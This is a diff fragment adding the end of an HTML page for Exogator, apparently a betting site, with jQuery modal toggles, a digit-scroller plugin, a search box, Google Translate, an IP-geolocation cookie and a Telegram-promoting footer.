+        $('#loginfirst').hide();
+        $('body').css('overflow', 'scroll');
+        $('body').css('overflow-x', 'hidden');
+    });
+    
+     $('#showmyaccount').click(function(){
+        $('#myaccount').show();
+        $('body').css('overflow', 'hidden');
+    });
+    
+    $('#myaccountclose').click(function(){
+        $('#myaccount').hide();
+        $('body').css('overflow', 'scroll');
+        $('body').css('overflow-x', 'hidden');
+    });
+    
+    
+    
+    function checkCookie(name) {
+        var cookie = getCookie(name);
+        return cookie !== null;
+    }
+    
+
+    function shownextstep(){
+        $('#firstone').hide();
+        $('#nextstep').show();
+    }
+
+    
+    $('#showburger').click(function(){
+        $('#waitdownload').show();
+        $('body').css('overflow', 'hidden');
+    });
+
+    $('#waitdownloadclose').click(function(){
+        $('#waitdownload').hide();
+        $('body').css('overflow', 'scroll');
+        $('body').css('overflow-x', 'hidden');
+    });
+    
+    $('#waitdownloadclose2').click(function(){
+        $('#waitdownload').hide();
+        $('body').css('overflow', 'scroll');
+        $('body').css('overflow-x', 'hidden');
+    });
+    
+    
+    $('#showburger').click(function(){
+        $('#burger').show();
+        $('body').css('overflow', 'hidden');
+    });
+
+    $('#burgerclose').click(function(){
+        $('#burger').hide();
+        $('body').css('overflow', 'scroll');
+        $('body').css('overflow-x', 'hidden');
+    });
+    
+     $('#showwithdrawal').click(function(){
+        $('#withdrawal').show();
+        $('body').css('overflow', 'hidden');
+    });
+
+    $('#withdrawalclose').click(function(){
+        $('#withdrawal').hide();
+        $('body').css('overflow', 'scroll');
+        $('body').css('overflow-x', 'hidden');
+    });
+    
+     $('#showpagerequest').click(function(){
+        $('#pagerequest').show();
+        $('body').css('overflow', 'hidden');
+    });
+
+    $('#pagerequestclose').click(function(){
+        $('#pagerequest').hide();
+        $('body').css('overflow', 'scroll');
+        $('body').css('overflow-x', 'hidden');
+    });
+
+    /**
+    * Project: https://github.com/svichas/jquery.digitScroller.js
+    * Author: Stefanos Vichas
+    * License: MIT
+    */
+
+    $.fn.digitScroller = function(options) {
+
+      // set default options
+      options.scrollTo = typeof options.scrollTo === "undefined" ? 0 : options.scrollTo;
+      options.scrollDuration = typeof options.scrollDuration === "undefined" ? 0 : options.scrollDuration;
+      options.animationEnd = typeof options.animationEnd === "undefined" ? function() {} : options.animationEnd;
+
+      // inits variables
+      var $this = $(this);
+      var tempString = $this.html();
+      var tempElements = [];
+      var digitScrollerLength = tempString.length;
+      var scrolling = false;
+      var digitScrollEventTimer;
+
+
+      if (!$this.hasClass('__digit_scroller_wrap')) {
+
+        // format element stracture
+        $this.addClass("__digit_scroller_wrap");
+
+        $this.html("");
+        for (var i = 0; i < tempString.length; i++) {
+          var tempElement = $("<span/>", {
+            class: "__digit_scroller_digit"
+          });
+
+          $("<span/>", {
+            class: "__digit_scroller_current_digit",
+            html: tempString.charAt(i)
+          }).appendTo(tempElement);
+
+          $("<span/>", {
+            class: "__digit_scroller_next_digit",
+            html: tempString.charAt(i)
+          }).appendTo(tempElement);
+
+          tempElement.appendTo($this);
+        }
+
+      }
+
+
+      /**
+      * Core method that controls when to update digits
+      */
+      function digitScrollEvent() {
+
+        var currentValue = getCurrentValue();
+
+        if (currentValue == options.scrollTo) {
+          scrolling = false;
+          options.animationEnd(); // fire animation end event
+          clearInterval(digitScrollEventTimer) // clear interval
+          return;
+        }
+
+        if (options.scrollTo > currentValue) {
+          currentValue++;
+        } else {
+          currentValue--;
+        }
+
+        updateNextValue(currentValue);
+      }
+
+      /**
+      * Methos to go to top with animation
+      */
+      function goUp(digitPos) {
+        var _digit = $this.find(".__digit_scroller_digit").eq(digitPos);
+        _digit
+        .css("transition", "transform " + options.scrollDuration + "ms ease")
+        .addClass("_digit_up");
+      }
+
+      /**
+      * Methos to get current digit value
+      */
+      function getCurrentValue() {
+        var currentValueString = 0;
+        $this.find('.__digit_scroller_digit').each(function() {
+          currentValueString += $(this).find(".__digit_scroller_current_digit").html();
+        });
+        return parseInt(removeFrontZeros(currentValueString));
+      }
+
+      function removeFrontZeros(currentValueString) {
+        if (!currentValueString.includes("-")) return currentValueString;
+        return currentValueString.replace(new RegExp("^[0]*"), '');
+      }
+
+      /**
+      * Methos to update next values
+      */
+      function updateNextValue(newValue) {
+        newValue = bulkDigits(newValue);
+
+        // create digit
+        for (i=$this.find(".__digit_scroller_digit").length;i<newValue.length;i++) {
+
+          var tempElement = $("<span/>", {
+            class: "__digit_scroller_digit"
+          });
+
+          $("<span/>", {
+            class: "__digit_scroller_current_digit",
+            html: "0"
+          }).appendTo(tempElement);
+
+          $("<span/>", {
+            class: "__digit_scroller_next_digit",
+            html: "0"
+          }).appendTo(tempElement);
+
+          tempElement.appendTo($this);
+        }
+
+        var count = 0;
+        $this.find('.__digit_scroller_digit').each(function() {
+          // change if need to change
+          if ($(this).find(".__digit_scroller_next_digit").html() != newValue.charAt(count)) {
+            $(this).find(".__digit_scroller_next_digit").html(newValue.charAt(count));
+            goUp(count, true);
+          }
+          count++;
+        });
+
+        setTimeout(setNextToCurrent, options.scrollDuration-25);
+      }
+
+      /**
+      * Method to set next values to current values
+      */
+      function setNextToCurrent() {
+
+        // setting next to current
+        $this.find('.__digit_scroller_digit').each(function() {
+          $(this).find(".__digit_scroller_current_digit").html($(this).find(".__digit_scroller_next_digit").html());
+        });
+
+        // move current to show it and next to bottom without animating it
+        $this.find(".__digit_scroller_digit")
+        .css("transition", "transform 0ms ease 0s")
+        .removeClass('_digit_up');
+
+      }
+
+      /**
+      * Method to fill gaps in a number by adding zeros
+      */
+      function bulkDigits(val) {
+        val = String(val);
+        if (val.length >= digitScrollerLength) return val;
+        for (var i = val.length;i < digitScrollerLength;i++) {
+          val = "0" + val;
+        }
+        return val;
+      }
+
+
+      /**
+      * Method to scroll to a number
+      */
+      this.scrollTo = function(svalue) {
+        if (scrolling) return;
+
+        scrolling = true;
+        options.scrollTo = svalue;
+
+        setTimeout(function() {
+          digitScrollEvent();
+        }, 1);
+        digitScrollEventTimer = setInterval(digitScrollEvent, options.scrollDuration);
+
+        return true;
+      }
+
+      this.jumpTo = function(value) {
+        setTimeout(function() {
+          updateNextValue(value);
+        }, 1);
+      }
+
+
+      /**
+      * Method to change scroll duration animation
+      */
+      this.scrollDuration = function(durr) {
+        options.scrollDuration = durr;
+        return true;
+      }
+
+      return this;
+
+    };
+
+   
+
+ </script>
+ 
+ 
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+<script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+
+<script>
+
+    function googleTranslateElementInit() {
+        var elementsToTranslate = document.querySelectorAll(".translate");
+
+        new google.translate.TranslateElement({
+            pageLanguage: 'en',
+            includedLanguages: 'en',
+            autoDisplay: true
+        }, 'google_translate_element');
+
+        for (var i = 0; i < elementsToTranslate.length; i++) {
+            var element = elementsToTranslate[i];
+            element.classList.add('translatable'); // Add a class to mark elements as translatable
+        }
+
+        var a = document.querySelector("#google_translate_element select");
+        a.selectedIndex = 1;
+        a.dispatchEvent(new Event('change'));
+    }
+</script>
+
+<script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+
+<script>
+
+   document.addEventListener('DOMContentLoaded', function () {
+    const tooltipTriggerList = document.querySelectorAll('[data-bs-toggle="tooltip"]');
+    const tooltipList = [...tooltipTriggerList].map(tooltipTriggerEl => new bootstrap.Tooltip(tooltipTriggerEl));
+    });
+
+
+    $('.User-avtar').click(function(){
+            if( $(".User-Dropdown").hasClass( "U-open" ) ){
+                  $('.User-Dropdown').removeClass("U-open");
+            }else {
+                  $('.User-Dropdown').addClass("U-open");
+            }
+
+            if( $(".currency-Dropdown").hasClass( "U-open" ) ){
+                  $('.currency-Dropdown').removeClass("U-open");
+            }
+            if( $(".lang-Dropdown").hasClass( "U-open" ) ){
+                  $('.lang-Dropdown').removeClass("U-open");
+            }
+        });
+    
+        function goto(a){window.open(a, "_self");}
+
+        function number_format (number, decimals, dec_point, thousands_sep) {
+            // Strip all characters but numerical ones.
+            number = (number + '').replace(/[^0-9+\-Ee.]/g, '');
+            var n = !isFinite(+number) ? 0 : +number,
+                prec = !isFinite(+decimals) ? 0 : Math.abs(decimals),
+                sep = (typeof thousands_sep === 'undefined') ? ',' : thousands_sep,
+                dec = (typeof dec_point === 'undefined') ? '.' : dec_point,
+                s = '',
+                toFixedFix = function (n, prec) {
+                    var k = Math.pow(10, prec);
+                    return '' + Math.round(n * k) / k;
+                };
+            // Fix for IE parseFloat(0.55).toFixed(0) = 0;
+            s = (prec ? toFixedFix(n, prec) : '' + Math.round(n)).split('.');
+            if (s[0].length > 3) {
+                s[0] = s[0].replace(/\B(?=(?:\d{3})+(?!\d))/g, sep);
+            }
+            if ((s[1] || '').length < prec) {
+                s[1] = s[1] || '';
+                s[1] += new Array(prec - s[1].length + 1).join('0');
+            }
+            return s.join(dec);
+        }
+        
+        $('#searchCloseButton').click(function(){
+            $('#searcharea').hide();
+        });
+        
+        $('#searchme').click(function(){ 
+            $('#searcharea').show();
+        });
+    
+        var setInnerHTML = function(elm, html) {
+      elm.innerHTML = html;
+      Array.from(elm.querySelectorAll("script")).forEach( oldScript => {
+        const newScript = document.createElement("script");
+        Array.from(oldScript.attributes)
+          .forEach( attr => newScript.setAttribute(attr.name, attr.value) );
+        newScript.appendChild(document.createTextNode(oldScript.innerHTML));
+        oldScript.parentNode.replaceChild(newScript, oldScript);
+      });
+    }
+    
+    $(document).mouseup(function(e) 
+    {
+        var container = $("#searchresult2");
+    
+        // if the target of the click isn't the container nor a descendant of the container
+        if (!container.is(e.target) && container.has(e.target).length === 0) 
+        {
+            container.hide();
+        }
+    });
+    
+    function search() {
+        
+        $('#searchresult2').show(200);
+        var ajaxDisplay         = document.getElementById("searchresult2");
+        var searchtext            = document.getElementById("searchtext2").value;
+        
+    
+        $.ajax({    
+            type: 'POST',
+            data: 'searcht='+ searchtext,
+            url:  "https://exogator.com/en/searching", 
+            success: function(olaaa) {
+                ajaxDisplay.innerHTML = olaaa;
+            }
+        });
+    };
+    
+    function isMobileDevice() {
+      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    
+      // Check for the most common mobile user agents
+      if (/android/i.test(userAgent)) {
+        return true;
+      }
+      if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+        return true;
+      }
+      return false;
+    }
+    
+</script>
+
+<script>
+
+    function getCookie(name) {
+        function escape(s) { return s.replace(/([.*+?\^$(){}|\[\]\/\\])/g, '\\$1'); }
+        var match = document.cookie.match(RegExp('(?:^|;\\s*)' + escape(name) + '=([^;]*)'));
+        return match ? match[1] : null;
+    }
+        
+    const generateRandomString = (length) => {
+        const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        let randomString = "";
+        for (let i = 0; i < length; i++) {
+          const randomIndex = Math.floor(Math.random() * charset.length);
+          randomString += charset[randomIndex];
+        }
+        return randomString;
+      };
+    
+         if (!document.cookie.includes("Yc6q5sdlon")) {
+      const get_ip = async () => {
+        const response = await fetch('https://api64.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+      };
+
+       get_ip().then((ip) => {
+        fetch(`https://ipinfo.io/${ip}/json?token=de6b19d636388d`)
+          .then((response) => response.json())
+          .then((ipinfo) => {
+            const continent = ipinfo.timezone.split("/")[0];
+            const country = ipinfo.country;
+            const randomString = generateRandomString(70);
+            const cookieValue = `${randomString.toLowerCase()}.${country.toLowerCase()}.${continent.toLowerCase()}`;
+            setCookie("Yc6q5sdlon", cookieValue, 900);
+          });
+      });
+    }
+    
+        
+    
+      const setCookie = (name, value, days) => {
+        const date = new Date();
+        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+        const expires = "expires=" + date.toUTCString();
+        document.cookie = name + "=" + value + "; " + expires + "; path=/";
+      };
+    
+
+    $(function () {
+      $(document).scroll(function () {
+        var $nav = $(".sticky-top");
+        $nav.toggleClass('scrolled', $(this).scrollTop() > 0);
+      });
+    });
+    
+
+</script>
+
+
+</body>
+<footer class="d-flex flex-wrap justify-content-between align-items-center py-3 my-35" style=" background-repeat: no-repeat !important;  margin: 300px 0 0 0 !important; min-height: 350px; color:#fff; ">
+    <div class="container" >
+
+    <div class="col-12 row" style="margin: 0;" >
+        <div class="col-12" style="margin:10px 0px;"></div>
+
+        <style type="text/css">
+            .footer-links a { display:block; margin:5px 0px; color:#fff; text-decoration:none; font-weight:400; }
+            .footer-links a:hover {color: var(--main);}
+            .footer-links-icon {padding: 30px 0px 0px 0px;}
+            .footer-links-icon a {  margin:5px 5px; color:#fff; text-decoration:none; font-weight:400; font-size: 30px;}
+            .footer-links-icon a:hover {color: var(--main);}
+        </style>
+
+        <div class="row" style="background: #1f1f1f;border-radius: 61px;padding: 22px 10px; margin:0 !important; "> <div class="col-12 col-md-4" style="text-aling:center;"><center><img src="https://i.imgur.com/YCr54Ni.png" style=" width: 100%; max-width: 240px; "></center> </div> <div class="col-12 col-md-8" style="text-align:center; align-content: center; padding: 0px 49px; "> <div> <h1 style=" font-weight: 700; ">Join us on Telegram</h1><p style=" color: #ccc; font-weight: 300; font-size: 18px; ">Join over 15k members and get notified about announcements, updates, big hits, and much more!</p> <button onclick="goto('https://t.me/exogator15')" style=" background: #abfb4f; color: #000 !important; border-radius: 18px; padding: 14px 2px; font-size: 17px; border: 2px solid #d6ebfd30; " class="cart-button">Join Exogators</button> </div> </div> </div>
+        
+        <div class="col-12" style="margin:30px 0px 20px 0px; border-bottom: 1px solid #ccc;"></div>
+        <div class="col-sm-12 col-md-4">
+            <b>© 2025 Exogator</b>
+        </div>
+        
+    </div>
+    
+    </div>
+    
+     <style>
+    #google_translate_element,.skiptranslate{display:none;}body{top:0!important;}
+    *.goog-te-menu-value { 
+        color:none;
+    }
+    div#google_translate_element div.goog-te-gadget-simple a.goog-te-menu-value span:hover {
+        color:none;
+    }
+    .translatable { color: njds !important;  }
+</style>
+<div id="google_translate_element"></div>
+    
+</footer>
+
+
+</html
